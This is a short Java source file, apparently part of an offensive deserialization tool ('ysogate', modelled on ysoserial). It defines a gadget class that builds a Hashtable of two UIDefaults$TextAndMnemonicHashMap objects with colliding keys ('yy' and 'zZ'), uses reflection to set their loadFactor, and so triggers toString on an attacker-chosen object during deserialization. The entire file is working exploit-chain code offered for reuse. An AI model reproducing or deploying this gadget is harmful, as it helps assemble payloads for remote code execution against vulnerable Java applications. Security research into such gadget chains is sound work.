package com.h2tg.ysogate.bullet.jdk;

import com.h2tg.ysogate.bullet.base.IReadObject2ToString;

import java.util.Hashtable;
import java.util.Map;

import static com.h2tg.ysogate.utils.Reflections.*;

public class GUIDefaults implements IReadObject2ToString
{
    @Override
    public Object readObjectToString(Object o) throws Exception{
        Class<?> innerClass=Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap1 = (Map) createInstanceUnsafely(innerClass);
        Map tHashMap2 = (Map) createInstanceUnsafely(innerClass);
        tHashMap1.put(o,"yy");
        tHashMap2.put(o,"zZ");
        setFieldValue(tHashMap1,"loadFactor",1);
        setFieldValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,1);
        hashtable.put(tHashMap2,1);

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }
}
